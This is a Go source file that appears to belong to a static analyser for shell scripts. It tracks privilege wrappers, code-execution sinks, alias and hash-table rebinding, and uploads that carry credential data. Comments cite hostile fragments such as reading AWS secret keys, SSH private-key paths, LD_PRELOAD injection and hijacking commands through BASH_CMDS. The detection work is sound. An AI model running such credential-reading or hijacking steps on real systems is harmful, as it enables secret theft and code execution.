// taintEgressWithSecret joins the secret label onto a statement's bottom-tainted
// egress when the same statement read credential material — either through a
// secret-read effect of its own or through a secret-tainted operand. It only ever
// adds a label to a sink that carries none, so a sink whose provenance is already
// known is untouched and an ordinary upload (no secret in the statement) is
// unaffected.
func (it *interp) taintEgressWithSecret(effStart int, payload engine.Taint) {
	if effStart < 0 || effStart >= len(it.effs) {
		return
	}
	secret := payload.Contains(engine.TaintSecret)
	if !secret {
		for _, e := range it.effs[effStart:] {
			if engine.IsSecretRead(e) {
				secret = true
				break
			}
		}
	}
	if !secret {
		return
	}
	for i := effStart; i < len(it.effs); i++ {
		if it.effs[i].Kind == engine.KindNetEgress && it.effs[i].Taint.IsBottom() {
			it.effs[i].Taint = it.effs[i].Taint.Join(engine.TaintOf(engine.TaintSecret))
		}
	}
}

// elevateWrappers consults the resolver for a call that never reaches the
// ordinary binding path — the wrapper consumed the whole command line, or the
// inner command's name is not statically known, or the inner call is a
// code-execution sink or code-executing builtin (those branches return before
// the ordinary resolver consult). The elevation knowledge for privilege
// wrappers (sudo) lives in the binding layer, so the call still goes through
// the seam: the binder reports the wrapper's own effects (PrivEsc for sudo,
// per the refined -u doctrine) and, for a dynamically-named inner command, its
// own ⊤ on top. A ⊤ CodeExec the interpreter has already derived FOR THE SAME
// STATEMENT (the effects from effStart on) subsumes the binder's own ⊤ —
// Report.Normalize keys the merge on the flow role, so adding both would
// report the same unknown execution twice. Callers must have derived their own
// interpreter-side ⊤ first, which is what makes the subsumption sound; the
// statement boundary keeps an earlier statement's ⊤ from suppressing this
// statement's binder evidence. A nil resolver contributes nothing.
func (it *interp) elevateWrappers(cmd *Command, effStart int) {
	if it.res == nil || len(cmd.Wrappers) == 0 {
		return
	}
	bound := it.res(cmd, it.resolutionProgram())
	// The seam is consulted here for the wrapper's own elevation evidence.
	// A result without a PrivEsc effect has nothing this path needs: in
	// particular its unresolved-inner ⊤ (the interpreter deliberately skips
	// shell-only builtins and code-execution names) must not fabricate a
	// Critical verdict for benign `env true`-style lines — such a line runs
	// effect-free, and the elevation knowledge is exactly what is absent.
	hasElevation := false
	for _, e := range bound.Effects {
		if e.Kind == engine.KindPrivEsc {
			hasElevation = true
			break
		}
	}
	if !hasElevation {
		return
	}
	if hasTopCodeExec(it.effs[effStart:]) {
		bound.Effects = dropTopCodeExec(bound.Effects)
		bound.Derivations = dropTopCodeExecDerivations(bound.Derivations)
	}
	it.effs = append(it.effs, bound.Effects...)
	it.ders = append(it.ders, bound.Derivations...)
}

// hasTopCodeExec reports whether the given statement-scoped effect slice
// already records a ⊤ CodeExec effect, under any network-flow role.
func hasTopCodeExec(effs []engine.Effect) bool {
	for _, e := range effs {
		if e.Kind == engine.KindCodeExec && e.Target.IsTop() {
			return true
		}
	}
	return false
}

// dropTopCodeExec removes the ⊤ CodeExec effects from a binder result, keeping
// the rest in order. The copies are fresh slices: the seam contract makes the
// result owned by the caller, and a non-mutating filter keeps that true even
// if a resolver ever returns shared backing arrays.
func dropTopCodeExec(effs []engine.Effect) []engine.Effect {
	kept := make([]engine.Effect, 0, len(effs))
	for _, e := range effs {
		if e.Kind == engine.KindCodeExec && e.Target.IsTop() {
			continue
		}
		kept = append(kept, e)
	}
	return kept
}

// dropTopCodeExecDerivations removes the derivations that justify the ⊤
// CodeExec effects dropTopCodeExec removed, so no why-trace is left pointing
// at a dropped effect.
func dropTopCodeExecDerivations(ders []engine.Derivation) []engine.Derivation {
	kept := make([]engine.Derivation, 0, len(ders))
	for _, d := range ders {
		if d.Effect.Kind == engine.KindCodeExec && d.Effect.Target.IsTop() {
			continue
		}
		kept = append(kept, d)
	}
	return kept
}

// dispatch applies the name-resolution chain with the interpreter's own state:
// aliases are expanded, functions are executed, code-execution sinks and
// code-executing builtins yield ⊤, and every other command's effects come from
// the resolver.
func (it *interp) dispatch(name string, nameOK, nameQuoted bool, argv []string, cmd *Command, effStart int) []engine.Effect {
	if !nameOK {
		e := it.markTopEffectFlow("dynamically-named command", it.sinkFlowRole(cmd))
		it.derive(e, engine.Atom{Kind: engine.AtomCommand, Text: cmd.Name, Loc: sourceLoc(cmd.Pos, it.prog.File)})
		// A privilege wrapper over a dynamically-named command (sudo "$X")
		// still elevates: consult the resolver seam for the wrapper's own
		// effects even though the inner name cannot be bound.
		it.elevateWrappers(cmd, effStart)
		it.statusKnown = false
		return nil
	}

	// An external-exec wrapper (command/env/sudo/nohup/timeout/xargs/setsid)
	// looks the operand up in PATH and execs it in a new process, so shell
	// aliases and functions are bypassed; `command` additionally suppresses
	// alias expansion.
	external := len(cmd.Wrappers) > 0

	// alias expansion (bounded, then handed to the interpreter proper). bash
	// expands an alias only for an unquoted command word, so a quoted or
	// backslash-escaped name is never rewritten to the alias body (Finding 78);
	// and when an earlier `alias`/`unalias` operand was not statically known the
	// table itself is unbounded, so the invocation degrades to ⊤ instead of
	// trusting a body that may no longer be declared.
	if !external && !nameQuoted {
		for depth := 0; depth < maxAliasDepth; depth++ {
			body, ok := it.state.Aliases[name]
			if !ok {
				break
			}
			if it.aliasOpaque {
				e := it.markTopEffectFlow("alias table not statically known", it.sinkFlowRole(cmd))
				it.derive(e, engine.Atom{Kind: engine.AtomCommand, Text: name, Loc: sourceLoc(cmd.Pos, it.prog.File)})
				it.setStatus(name)
				return nil
			}
			nn, nargs, rewritten, ok2 := it.expandAliasInvocation(body, cmd, argv)
			if !ok2 {
				break
			}
			name, argv = nn, nargs
			if rewritten != nil {
				// The body carried a wrapper chain, environment assignments or
				// an expansion-bearing word: it was expanded against Σ and
				// handed over as a whole invocation, so the binder sees the
				// payload the alias really runs (Findings 19/20).
				cmd = rewritten
				nameOK = rewritten.Name != ""
				argv = make([]string, 0, len(rewritten.Args))
				for _, w := range rewritten.Args {
					argv = append(argv, w.Value)
				}
			}
			// A wrapper donated by the body makes the effective command
			// external: bash execs it in a new process, so no further alias
			// applies to it.
			if len(cmd.Wrappers) > 0 {
				break
			}
		}
	}

	// find(1)'s -exec/-execdir/-ok/-okdir actions run an arbitrary command on
	// every file the search matched: analyse each payload as the invocation it
	// performs (Finding 2). It is handled here, after alias expansion, so the
	// alias spelling of the same invocation (`alias p='find … -exec …'; p`)
	// reports what the direct spelling reports. A payload the analysis cannot
	// bound — a dynamically-named command, an expansion-bearing word, an
	// unresolvable search root — degrades to ⊤, never to a narrow, fabricated
	// effect set.
	if nameOK && name == "find" && cmd != nil && it.findDepth < maxFindDepth {
		it.findDepth++
		for _, pl := range it.norm.findPayloadsOfWords(cmd.Args) {
			if pl == nil || pl.Cmd == nil {
				continue
			}
			if !pl.Certain || pl.Cmd.Name == "" {
				e := it.markTopEffect("find exec payload not analyzable")
				it.derive(e, engine.Atom{Kind: engine.AtomCommand, Text: "find", Loc: sourceLoc(cmd.Pos, it.prog.File)})
				continue
			}
			anchorCommand(pl.Cmd, cmd.Pos)
			pArgs := make([]string, 0, len(pl.Cmd.Args))
			for _, w := range pl.Cmd.Args {
				pArgs = append(pArgs, w.Value)
			}
			it.dispatch(pl.Cmd.Name, true, false, pArgs, pl.Cmd, len(it.effs))
		}
		it.findDepth--
	}

	// shell functions declared by the program
	if fd := it.funcRaw[name]; fd != nil && !external {
		it.callFunc(fd, argv, cmd)
		// A user function's exit status is the body's last status; keying it on
		// the (possibly builtin-matching) name would be wrong, so leave whatever
		// the body computed (unknown for a body that computes none).
		return nil
	}

	// code-execution sinks: data flowing in is data executed. The invoked
	// program is resolved to the sink it runs — by basename (`/bin/sh`) and
	// through `env` (`/usr/bin/env bash`) — so a path-qualified invocation is
	// recognised like the bare spelling.
	if sink := sinkName(name, argv); sink != "" {
		e := it.markTopEffectFlow("code-execution sink "+strconv.Quote(sink), it.sinkFlowRole(cmd))
		it.derive(e, engine.Atom{Kind: engine.AtomCommand, Text: sink, Loc: sourceLoc(cmd.Pos, it.prog.File)})
		// A privilege wrapper over a sink (`sudo sh -c …`) still elevates:
		// consult the resolver seam for the wrapper's own effects even though
		// the sink branch never reaches the ordinary binding flow.
		it.elevateWrappers(cmd, effStart)
		it.setStatus(name)
		return nil
	}

	// A command language delivered on standard input is code the analysis cannot
	// bound: sqlite3's `.shell`, gdb's `shell`, an interactive SQL client's
	// `\!`, ssh's remote login shell. The operand spellings of the same
	// capability are declared CodeExec in the knowledge base, so the stdin
	// spelling must reach the same ⊤ verdict instead of binding only the
	// program's file operands (Finding 60).
	if it.stdinFed && stdinCodeClient(name, argv) {
		e := it.markTopEffectFlow("command language on standard input to "+strconv.Quote(commandBase(name)), it.sinkFlowRole(cmd))
		it.derive(e, engine.Atom{Kind: engine.AtomCommand, Text: commandBase(name), Loc: sourceLoc(cmd.Pos, it.prog.File)})
		it.elevateWrappers(cmd, effStart)
		it.setStatus(name)
		return nil
	}

	// builtins that mutate Σ
	it.builtinState(name, argv)
	// value-assigning builtins whose target variable the state emitter above does
	// not model (mapfile/readarray, printf -v): a credential read into the
	// variable must keep its provenance, or the sink that uploads it is
	// untainted (Finding 51).
	it.assigningBuiltinState(name, argv, cmd)
	// `set --` / `shift` rebind the positional parameters (Finding 61)
	it.positionalState(name, argv, cmd)

	// name-resolution state: `unalias -a` clears the alias table and
	// `hash -p` installs a command-hash binding, so both change what a LATER
	// command word runs. They are applied here, outside the variable transfer
	// function, because their subject is the resolution table and not Σ
	// (Findings 76/78).
	it.resolutionState(name, argv)

	// builtins that execute code supplied at run time. `trap` executes its
	// ACTION only when one is registered; the bare listing/query forms
	// (`trap`, `trap -p`, `trap - SIG`) carry no action and execute nothing.
	if isCodeExecBuiltin(name) && (name != "trap" || trapHasAction(argv)) {
		e := it.markTopEffectFlow("code-executing builtin "+strconv.Quote(name), it.sinkFlowRole(cmd))
		it.derive(e, engine.Atom{Kind: engine.AtomCommand, Text: name, Loc: sourceLoc(cmd.Pos, it.prog.File)})
		// A privilege wrapper over a code-executing builtin (`sudo eval …`)
		// still elevates: consult the resolver seam for the wrapper's own
		// effects even though this branch never reaches the ordinary binding
		// flow.
		it.elevateWrappers(cmd, effStart)
		it.setStatus(name)
		return nil
	}

	// builtins that are pure shell state: they have no external effect, so
	// asking the knowledge base about them would only produce a spurious ⊤,
	// and no elevation is claimed for them either (`sudo true` reports a
	// benign empty report — a documented precision residual, SECURITY.md
	// Known Risks).
	if isShellOnlyBuiltin(name) {
		switch name {
		case "break":
			it.ctl = ctlBreak
		case "continue":
			it.ctl = ctlContinue
		case "return":
			it.ctl = ctlReturn
		case "exit":
			it.ctl = ctlExit
		}
		it.setStatus(name)
		return nil
	}

	// declared effects, from the binding layer
	if it.res == nil {
		it.addNote("no effect resolver bound for " + strconv.Quote(name))
		it.setStatus(name)
		return nil
	}
	// The shell's command-hash table: bash resolves a name bound by
	// `hash -p PATH NAME` to PATH without consulting PATH or a builtin of the
	// same name, so the invocation runs that binary's effects — not the
	// knowledge-base row of the name (Finding 76). A binding whose path (or
	// whose name) the analysis could not resolve leaves the invocation
	// unbounded, so it degrades to ⊤ instead of asserting a narrow effect set.
	if !external {
		if it.hashOpaque {
			why := it.hashOpaqueWhy
			if why == "" {
				why = "name resolution unbound after a dynamic hash -p"
			}
			e := it.markTopEffectFlow(why, it.sinkFlowRole(cmd))
			it.derive(e, engine.Atom{Kind: engine.AtomCommand, Text: name, Loc: sourceLoc(cmd.Pos, it.prog.File)})
			it.setStatus(name)
			return nil
		}
		if path, hashed := it.hashTable[name]; hashed {
			if path == "" {
				e := it.markTopEffectFlow("hashed name "+strconv.Quote(name)+" with an unresolvable path", it.sinkFlowRole(cmd))
				it.derive(e, engine.Atom{Kind: engine.AtomCommand, Text: name, Loc: sourceLoc(cmd.Pos, it.prog.File)})
				it.setStatus(name)
				return nil
			}
			cmd.Name = path
			cmd.NameWord = &Word{Value: path, Literal: true, Pos: cmd.Pos}
			name = path
		}
	}
	// A quoted or backslash-escaped command word is never alias-expanded, so
	// the resolution view must not carry the alias the shell would ignore.
	rp := it.resolutionProgram()
	if nameQuoted {
		rp = it.resolutionProgramExcluding(name)
	}
	bound := it.res(cmd, rp)
	it.effs = append(it.effs, bound.Effects...)
	it.ders = append(it.ders, bound.Derivations...)
	it.setStatus(name)
	return bound.Effects
}

// outTaintOf returns the provenance of the data a command writes to its standard
// output, given the effects it contributes and the provenance of what it reads
// on standard input. It is deliberately a per-command over-approximation: a
// command may echo to stdout anything it read (filesystem reads, credential
// access) or was fed on stdin, and network responses it received are
// attacker-influenced. Keeping the join per-command — and not per-script — is
// what makes an egress pairing a real data flow rather than mere co-occurrence.
func outTaintOf(effs []engine.Effect, stdinTaint engine.Taint) engine.Taint {
	t := stdinTaint
	for _, e := range effs {
		switch e.Kind {
		case engine.KindFSRead:
			t = t.Join(e.Taint)
			for _, tg := range e.Target.Targets() {
				if engine.SecretPath(tg) {
					t = t.Join(engine.TaintOf(engine.TaintSecret))
				}
			}
		case engine.KindCredAccess:
			t = t.Join(e.Taint).Join(engine.TaintOf(engine.TaintSecret))
		case engine.KindEnvRead:
			// A credential held in the environment is a secret source exactly as
			// the file that holds it is: `printenv AWS_SECRET_ACCESS_KEY` writes
			// the token to stdout, so the next pipeline stage carries secret data
			// (Finding 7). Only a credential-SHAPED variable name qualifies, so a
			// read of PATH or HOME taints nothing.
			t = t.Join(e.Taint)
			if engine.IsSecretRead(e) {
				t = t.Join(engine.TaintOf(engine.TaintSecret))
			}
		case engine.KindNetIngress:
			t = t.Join(engine.TaintOf(engine.TaintUntrusted))
		}
	}
	return t
}

// setStatus records the exit status of a command when it is statically known.
func (it *interp) setStatus(name string) {
	switch name {
	case "true", ":":
		it.status, it.statusKnown = 0, true
	case "false":
		it.status, it.statusKnown = 1, true
	default:
		it.statusKnown = false
	}
}

// expandAliasInvocation expands one level of alias expansion: it parses the
// body and returns the command name and argv the invocation stands for.
//
// A body that reduces to a name plus literal words is reduced exactly as
// before — the binder then reports the alias chain — while a body carrying a
// wrapper chain, environment assignments or an expansion-bearing word cannot be
// reduced that way without silently dropping what it runs, so it is expanded
// against Σ and returned as a whole rewritten Command (Findings 19/20). The
// boolean is false when the body cannot be reduced at all (not one simple
// command, or a statement-level redirection): the caller then stops expanding
// and the binder degrades the body to ⊤.
func (it *interp) expandAliasInvocation(body string, cmd *Command, callArgv []string) (string, []string, *Command, bool) {
	p := Parse(Bash, "<alias>", body)
	if p.Top || len(p.Stmts) != 1 {
		return "", nil, nil, false
	}
	s := p.Stmts[0]
	if s == nil || s.Kind != KindSimple || s.Cmd == nil || s.Cmd.Name == "" {
		return "", nil, nil, false
	}
	// An alias body carrying a statement-level redirection cannot be reduced
	// to a name plus argument words without dropping the redirection's effects.
	// Reject it so the invocation falls through to the binder, whose
	// tokenizeAlias applies the same rule and degrades the body to ⊤ rather
	// than silently under-reporting (no-silent-miss).
	if len(s.Redirs) > 0 {
		return "", nil, nil, false
	}
	if !it.aliasBodyNeedsExpansion(s.Cmd) {
		args := make([]string, 0, len(s.Cmd.Args))
		for _, w := range s.Cmd.Args {
			args = append(args, w.Value)
		}
		return s.Cmd.Name, append(args, callArgv...), nil, true
	}
	return it.expandAliasBody(body, cmd)
}

// aliasBodyNeedsExpansion reports whether an alias body carries something the
// name-plus-literal-words reduction would drop: a wrapper chain (whose
// elevation the binder derives from Cmd.Wrappers), an environment assignment
// (an EnvWrite), a word that is not a literal — copying its empty Value would
// turn `@$HOME/.ssh/id_rsa` into an empty operand — a command/process
// substitution, whose code the reduction never executes, or a find(1) exec
// action, whose payload command line the reduction would hand to the binder as
// find's own operands.
func (it *interp) aliasBodyNeedsExpansion(c *Command) bool {
	if c == nil {
		return false
	}
	if len(c.Wrappers) > 0 || len(c.Assigns) > 0 {
		return true
	}
	for _, w := range c.Args {
		if w == nil {
			continue
		}
		if !w.Literal || wordHasSubst(w) {
			return true
		}
	}
	if c.Name == "find" && len(it.norm.findPayloadsOfWords(c.Args)) > 0 {
		return true
	}
	return false
}

// expandAliasBody rewrites an alias invocation into the invocation its body
// performs, with the body's own wrappers peeled, its environment assignments
// lifted, and every word expanded against the current Σ — exactly the treatment
// a directly written invocation of the body receives.
func (it *interp) expandAliasBody(body string, cmd *Command) (string, []string, *Command, bool) {
	parser := syntax.NewParser(syntax.Variant(syntax.LangBash))
	file, err := parser.Parse(strings.NewReader(body), "<alias>")
	if err != nil || file == nil || len(file.Stmts) != 1 {
		return "", nil, nil, false
	}
	st := file.Stmts[0]
	if st == nil || len(st.Redirs) > 0 {
		return "", nil, nil, false
	}
	ce, ok := st.Cmd.(*syntax.CallExpr)
	if !ok || len(ce.Args) == 0 {
		return "", nil, nil, false
	}

	// Peel the body's own wrappers with the normalizer's peel set and lift the
	// environment assignments they donate, so the wrapper chain reaches the
	// binder's elevation pass instead of being read as argv words.
	wrappers, wEnv, start := it.norm.unwrap(ce.Args)
	assigns := make([]*Assign, 0, len(ce.Assigns)+len(wEnv))
	for _, a := range ce.Assigns {
		assigns = append(assigns, it.norm.assign(a, ""))
	}
	assigns = append(assigns, wEnv...)
	// Expand the words the peel consumed too, so a substitution inside a
	// wrapper option still runs (mirrors the call-site treatment).
	for _, w := range ce.Args[:start] {
		it.expandFields(w)
	}
	rest := ce.Args[start:]
	if len(rest) == 0 {
		return "", nil, nil, false
	}

	// Every word is anchored at the call site: the body's own offsets are
	// relative to the alias text, and a why-trace pointing into it would name a
	// position the analysed source does not have.
	pos := cmd.Pos
	ew0 := it.expandFields(rest[0])
	if !ew0.known || len(ew0.fields) == 0 {
		return "", nil, nil, false
	}
	name := ew0.fields[0]
	args := make([]*Word, 0, len(rest)+len(cmd.Args))
	for _, f := range ew0.fields[min(1, len(ew0.fields)):] {
		args = append(args, &Word{Value: f, Literal: true, Taint: ew0.taint, Pos: pos})
	}
	for _, w := range rest[1:] {
		ew := it.expandFields(w)
		if !ew.known || len(ew.fields) == 0 {
			// An unquoted, wholly-unknown expansion yields no field: keep a
			// dynamic operand so the target degrades to ⊤, not to ⊥.
			args = append(args, &Word{Value: "", Literal: false, Taint: ew.taint, Pos: pos, Dir: it.wordDir(w, false)})
			continue
		}
		for _, f := range ew.fields {
			args = append(args, &Word{Value: f, Literal: ew.known, Taint: ew.taint, Pos: pos, Dir: it.wordDir(w, ew.known)})
		}
	}
	args = append(args, cmd.Args...)

	rw := &Command{
		Pos:        pos,
		Name:       name,
		NameWord:   &Word{Value: name, Literal: true, Pos: pos},
		Args:       args,
		Wrappers:   wrappers,
		Assigns:    assigns,
		StdinTaint: cmd.StdinTaint,
		Redirs:     cmd.Redirs,
	}

	// The body's environment assignments carry the same effects a directly
	// written invocation of the body receives (Finding 88). The rewritten
	// command is handed to dispatch, whose early-return paths (a shell-only
	// builtin, a code-executing builtin, a dynamically named command) never
	// reach the binder that emits EnvWrite for cmd.Assigns, and the binder has
	// no view of the exec-bearing variable set: `alias x='env LD_PRELOAD=…'; x`
	// reported EnvWrite only (allowed by a CodeExec-denying policy) and
	// `alias x='A=1 true'; x` reported no effect at all. Emitting both effects
	// here restores parity with the direct spelling; a duplicate EnvWrite merges
	// with the binder's on (kind, mode) during normalization.
	for _, a := range assigns {
		if a == nil || a.Name == "" {
			continue
		}
		var (
			val   string
			known bool
			taint engine.Taint
		)
		if a.Value != nil {
			val, known, taint = a.Value.Value, a.Value.Literal, a.Value.Taint
		}
		ew := envWriteEffect(a.Name, taint)
		it.effs = append(it.effs, ew)
		it.derive(ew, engine.Atom{Kind: engine.AtomLiteral, Text: a.Name, Loc: sourceLoc(pos, it.prog.File)})
		if ee, ok := ExecEnvEffect(a.Name, val, known, taint); ok {
			it.effs = append(it.effs, ee)
			it.derive(ee, engine.Atom{Kind: engine.AtomLiteral, Text: a.Name, Loc: sourceLoc(pos, it.prog.File)})
		}
	}
	argv := make([]string, 0, len(args))
	for _, w := range args {
		argv = append(argv, w.Value)
	}
	return name, argv, rw, true
}

// commandStringPayload analyses the command string a command-string wrapper
// carries (Finding 2). present is false when the line has no such option, so
// the wrapper's own binding stands; otherwise the payload is either bound as
// the invocation it performs or degraded to ⊤ CodeExec — the wrapper's row
// models the operand as a bare ProcSpawn, and that bounded spawn must never be
// the whole report for a line that runs an arbitrary command.
func (it *interp) commandStringPayload(name string, nameOK bool, argv []string, cmd *Command) bool {
	var text string
	var literal, present bool
	if nameOK && commandStringWrappers[name] {
		text, literal, present = wrapperCommandString(name, argv, cmd)
	}
	if !present {
		// The command string may also sit on a wrapper of the line
		// (`flock -c CMD FILE`), whose option words the normalizer recorded
		// instead of leaving them in argv.
		for _, w := range cmd.Wrappers {
			if w == nil || !commandStringWrappers[w.Name] {
				continue
			}
			if text, literal, present = wrapperOptionsCommandString(w.Name, w.Options); present {
				name = w.Name
				break
			}
		}
	}
	if !present {
		return false
	}
	loc := sourceLoc(cmd.Pos, it.prog.File)
	atom := engine.Atom{Kind: engine.AtomCommand, Text: name, Loc: loc}
	payload, bound := it.commandStringInvocation(text)
	if !literal || !bound {
		e := it.markTopEffect("wrapper payload is a command string the analysis cannot bound")
		it.derive(e, atom)
		return true
	}
	anchorCommand(payload, cmd.Pos)
	pArgs := make([]string, 0, len(payload.Args))
	for _, w := range payload.Args {
		pArgs = append(pArgs, w.Value)
	}
	it.dispatch(payload.Name, true, false, pArgs, payload, len(it.effs))
	return true
}

// wrapperOptionsCommandString is wrapperCommandString over a wrapper's recorded
// option words. The normalizer keeps the option and its value as separate
// entries and records the `@` placeholder for a value it could not resolve, so
// an `@` marks the payload as statically unknown.
func wrapperOptionsCommandString(name string, opts []string) (text string, literal, present bool) {
	valueOpts := wrapperCommandStringOpts[name]
	if valueOpts == nil {
		return "", false, false
	}
	for i := 0; i < len(opts); i++ {
		v := opts[i]
		spec, val, attached := v, "", false
		if k := strings.IndexByte(v, '='); k > 0 && strings.HasPrefix(v, "--") {
			spec, val, attached = v[:k], v[k+1:], true
		} else if strings.HasPrefix(v, "-c") && len(v) > 2 && !strings.HasPrefix(v, "--") {
			spec, val, attached = "-c", v[2:], true
		}
		if !valueOpts[spec] {
			continue
		}
		if attached {
			return val, val != "@", true
		}
		if i+1 >= len(opts) {
			return "", false, true
		}
		return opts[i+1], opts[i+1] != "@", true
	}
	return "", false, false
}

// wrapperCommandStringOpts names, per command-string wrapper, the options whose
// value is the shell command the wrapper runs.
var wrapperCommandStringOpts = map[string]map[string]bool{
	"su":      {"-c": true, "--command": true, "--session-command": true},
	"runuser": {"-c": true, "--command": true},
	"script":  {"-c": true, "--command": true},
	"flock":   {"-c": true, "--command": true},
}

// wrapperCommandString locates the payload string of a command-string wrapper
// among the invocation's words. literal reports that the word carrying the
// string is statically known; present reports that the option appears at all.
func wrapperCommandString(name string, argv []string, cmd *Command) (text string, literal, present bool) {
	opts := wrapperCommandStringOpts[name]
	if opts == nil || cmd == nil {
		return "", false, false
	}
	for i := 0; i < len(argv); i++ {
		v := argv[i]
		spec, val, attached := v, "", false
		if k := strings.IndexByte(v, '='); k > 0 && strings.HasPrefix(v, "--") {
			spec, val, attached = v[:k], v[k+1:], true
		} else if strings.HasPrefix(v, "-c") && len(v) > 2 && !strings.HasPrefix(v, "--") {
			spec, val, attached = "-c", v[2:], true
		}
		if !opts[spec] {
			continue
		}
		if attached {
			// The value was written on the option word itself, so its
			// literalness is the option word's.
			lit := true
			if i < len(cmd.Args) && cmd.Args[i] != nil {
				lit = cmd.Args[i].Literal
			}
			return val, lit, true
		}
		if i+1 >= len(argv) {
			return "", false, true
		}
		lit := true
		if i+1 < len(cmd.Args) && cmd.Args[i+1] != nil {
			lit = cmd.Args[i+1].Literal
		}
		return argv[i+1], lit, true
	}
	return "", false, false
}

// commandStringInvocation parses a wrapper's command string as the shell line it
// is and reduces it to one invocation. bound is false for anything the analysis
// cannot express as a single static argv — a pipeline, a compound command, a
// redirection, a variable expansion — which the caller degrades to ⊤ rather
// than guessing.
func (it *interp) commandStringInvocation(text string) (*Command, bool) {
	if text == "" || it.norm == nil {
		return nil, false
	}
	parser := syntax.NewParser(syntax.Variant(syntax.LangBash))
	file, err := parser.Parse(strings.NewReader(text), "<payload>")
	if err != nil || file == nil || len(file.Stmts) != 1 {
		return nil, false
	}
	st := file.Stmts[0]
	if st == nil || len(st.Redirs) > 0 {
		return nil, false
	}
	ce, ok := st.Cmd.(*syntax.CallExpr)
	if !ok || len(ce.Args) == 0 || len(ce.Assigns) > 0 {
		return nil, false
	}
	args := make([]*Word, 0, len(ce.Args))
	for _, a := range ce.Args {
		w := it.norm.word(a)
		if w == nil || !w.Literal || w.Value == "" {
			return nil, false
		}
		args = append(args, w)
	}
	return &Command{
		Name:     args[0].Value,
		NameWord: args[0],
		Args:     args[1:],
	}, true
}

// anchorCommand re-points every word of a synthesised command (and the command
// itself) at the position of the statement it was derived from, so the
// why-trace never cites a position inside a fragment that has none.
func anchorCommand(cmd *Command, pos Pos) {
	if cmd == nil {
		return
	}
	cmd.Pos = pos
	if cmd.NameWord != nil {
		cmd.NameWord.Pos = pos
	}
	for _, w := range cmd.Args {
		if w != nil {
			w.Pos = pos
		}
	}
}

// wordQuoted reports whether a command word was written with quoting or
// backslash escaping. The normalizer keeps backslash escapes in a literal's
// value, so an escaped character shows up as a backslash in the word's literal
// text; bash expands an alias only for an unquoted command word.
func wordQuoted(w *syntax.Word) bool {
	if w == nil {
		return false
	}
	for _, p := range w.Parts {
		switch p := p.(type) {
		case *syntax.SglQuoted, *syntax.DblQuoted:
			return true
		case *syntax.Lit:
			if strings.ContainsRune(p.Value, '\\') {
				return true
			}
		}
	}
	return false
}

// resolutionState applies the builtins that rewrite how a LATER command word is
// resolved. They are kept apart from builtinState because their subject is the
// resolution table, not Σ.
func (it *interp) resolutionState(name string, argv []string) {
	switch name {
	case "unalias":
		it.unaliasState(argv)
	case "hash":
		it.hashState(argv)
	}
}

// opaqueResolution records that name resolution is no longer provable, keeping
// the first cause so the ⊤ effect names it.
func (it *interp) opaqueResolution(why string) {
	if !it.hashOpaque {
		it.hashOpaque = true
		it.hashOpaqueWhy = why
	}
}

// systemPathDirs are the directories whose contents the host model treats as
// fixed: a PATH entry from one of them still names the binary the knowledge
// base documents for the name.
var systemPathDirs = map[string]bool{
	"/bin": true, "/sbin": true,
	"/usr/bin": true, "/usr/sbin": true,
	"/usr/local/bin": true, "/usr/local/sbin": true,
}

// isBashCMDSName reports whether a variable name (possibly subscripted) is
// BASH_CMDS, the shell's command-hash table exposed as an array: `BASH_CMDS[cat]=
// /tmp/evil` installs the binding `hash -p /tmp/evil cat` installs (Finding 90).
func isBashCMDSName(name string) bool {
	return name == "BASH_CMDS" || strings.HasPrefix(name, "BASH_CMDS[")
}

// pathRebinds reports whether an assignment to PATH can change which binary a
// later command word resolves to (Finding 90). Appending keeps the existing
// entries ahead of the new ones, and a value whose leading entry is a fixed
// system directory still resolves every documented name to the binary the
// knowledge base describes. Anything else — an unknown value, a relative or
// empty leading element, or a caller-chosen directory ahead of the system ones
// — leaves the mapping from name to binary unprovable.
func pathRebinds(known bool, val string, appendAssign bool) bool {
	if appendAssign {
		return false
	}
	if !known {
		return true
	}
	first, _, _ := strings.Cut(val, ":")
	switch {
	case first == "":
		// An empty leading element means the current directory.
		return true
	case !strings.HasPrefix(first, "/"):
		return true
	}
	return !systemPathDirs[path.Clean(first)]
}

// resolutionAssign applies the resolution-state half of a variable assignment.
// PATH selects which binary a command word resolves to and BASH_CMDS *is* the
// command-hash table, so an assignment to either changes what a later command
// word runs without the report saying so (Findings 76, 90). The assignment's
// own effect is emitted by the caller; this only records that the name tables
// can no longer be reconstructed.
func (it *interp) resolutionAssign(name string, hasIndex, appendAssign, known bool, val string) {
	if isBashCMDSName(name) {
		if known && val == "" {
			// Clearing the table (or one entry of it) removes bindings; it
			// installs none, so names resolve as themselves again.
			return
		}
		it.opaqueResolution("name resolution unbound after a write to BASH_CMDS")
		return
	}
	if name == "PATH" && !hasIndex && pathRebinds(known, val, appendAssign) {
		it.opaqueResolution("name resolution unbound after a PATH assignment")
	}
}

// unaliasState applies `unalias`. bash's `-a` removes every alias, and an
// operand the analysis cannot resolve may remove any of them — recorded so the
// next alias invocation degrades to ⊤ instead of trusting a body that may no
// longer be declared (Finding 78).
func (it *interp) unaliasState(argv []string) {
	for _, a := range argv {
		switch {
		case a == "-a" || a == "--all":
			it.state.Aliases = map[string]string{}
			return
		case a == "--" || strings.HasPrefix(a, "-"):
			continue
		case a == "":
			it.aliasOpaque = true
		default:
			delete(it.state.Aliases, a)
		}
	}
}

// hashState applies `hash`: bash memoises NAME → PATH, `-p filename` installs
// filename as the full pathname of NAME, `-d` forgets names, `-r` forgets every
// name and the listing forms change nothing. A binding whose path or name the
// analysis cannot resolve is recorded as unresolved, so a later invocation of
// the name degrades to ⊤ instead of binding the name's own knowledge-base row
// (Finding 76).
func (it *interp) hashState(argv []string) {
	for i := 0; i < len(argv); i++ {
		a := argv[i]
		switch {
		case a == "-r":
			it.hashTable = map[string]string{}
		case a == "-l" || a == "-t" || a == "-v":
			return
		case a == "-d":
			for _, n := range argv[i+1:] {
				switch {
				case len(n) > 0 && n[0] == '-':
				case n == "":
					it.hashOpaque = true
				default:
					delete(it.hashTable, n)
				}
			}
			return
		case strings.HasPrefix(a, "-p"):
			path := strings.TrimPrefix(a, "-p")
			if path == "" {
				if i+1 >= len(argv) {
					it.hashOpaque = true
					return
				}
				i++
				path = argv[i]
			}
			if i+1 >= len(argv) {
				it.hashOpaque = true
				return
			}
			i++
			name := argv[i]
			if name == "" {
				// The name that was rebound is unknown: any later invocation
				// may run a different binary.
				it.hashOpaque = true
				continue
			}
			it.hashTable[name] = path
		case len(a) > 0 && a[0] == '-':
			// other flags (-a, -c, …) carry no binding of their own
		default:
			// A bare `hash NAME` re-memoises what NAME already resolves to
			// through PATH, which changes nothing the analysis knows.
		}
	}
}

